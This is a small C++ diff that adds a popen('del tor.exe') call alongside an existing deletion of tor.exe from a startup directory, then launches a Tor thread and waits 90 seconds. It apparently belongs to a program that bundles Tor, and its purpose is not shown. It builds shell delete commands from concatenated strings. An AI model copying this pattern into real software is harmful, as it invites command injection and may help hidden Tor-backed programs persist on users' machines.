@@ -323,6 +323,8 @@ int main(int argc, char **argv)
     std::string n = "del " + startup_directory_del + "\\tor.exe\"";
     FILE *c_04 = popen(n.c_str(), "r");
     (void)pclose(c_04);
+    FILE *c_05 = popen("del tor.exe", "r");
+    (void)pclose(c_05);
     std::thread th(start_tor);
     th.join();
     std::this_thread::sleep_for(std::chrono::seconds(90));
